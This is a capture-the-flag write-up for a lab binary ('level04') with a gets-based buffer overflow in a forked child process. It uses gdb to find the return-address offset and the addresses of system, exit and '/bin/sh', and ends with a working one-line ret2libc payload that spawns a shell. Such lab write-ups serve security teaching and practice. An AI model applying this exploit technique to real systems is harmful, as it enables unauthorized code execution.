# level04

## Step 1: Understand the program
1. At the beginning, the program `forks`
2. The parent process `waits` until the child process `exits` or until a signal is received
3. The child process reads from `stdin` with a __vulnerable__ `gets` call
    - __The program segfault when the input is too long by overwriting `eip` or `eax` (I didn't try to know)__



## Step 2: Find the offset between the buffer and `eip` (or `eax`)

> We need to entrer in the child process with gdb because the vulnerability is in the child process.

```bash
(gdb) set follow-fork-mode child
```

If omitted, gdb will stays on the parent process

```console
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1948]
[Switching to process 1948]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41326641 in ?? ()
```

Offset = 156

> [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

## Step 3

Once in the child process, we can find the address of `system`, `exit` and `"/bin/sh"` to build a [__Ret2libc__](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

- Address of `system`:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
- Address of `exit`:
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```
- Address of `"/bin/sh"`:
```
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

## Exploit
```bash
(python -c 'print "A" * (156) + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | /home/users/level04/level04
```